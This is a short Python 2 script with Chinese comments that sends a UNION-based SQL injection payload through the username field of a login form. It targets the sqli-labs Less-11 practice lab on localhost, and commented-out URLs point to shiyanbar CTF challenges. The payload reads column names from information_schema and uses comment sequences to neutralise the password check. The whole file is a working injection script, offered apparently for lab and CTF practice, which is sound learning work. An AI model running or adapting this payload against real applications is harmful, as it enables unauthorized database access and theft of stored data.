# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://ctf5.shiyanbar.com/web/index_3.php?id=' #简单sql注入2
url='http://localhost/sqli-labs/Less-11/' #lesson 11
table='emails'
payload_table_from_tab="-1' union select group_concat(column_name),3 from information_schema.columns where table_name='"+table+"'" #从information_schema.tables中获取数据库所有表名
payload_end='-- #/*'
username=payload_table_from_tab+payload_end
password='*/-- #'
try:
    # 定义要提交的数据
    postdata = dict(uname=username, passwd=password)
    # url编码
    postdata = urllib.urlencode(postdata)
    # enable cookie
    req = urllib2.Request(url, postdata)
    res = urllib2.urlopen(req,data=None,timeout=2)
    text=res.read()
except Exception ,e:
    print "Error: "+e
print text

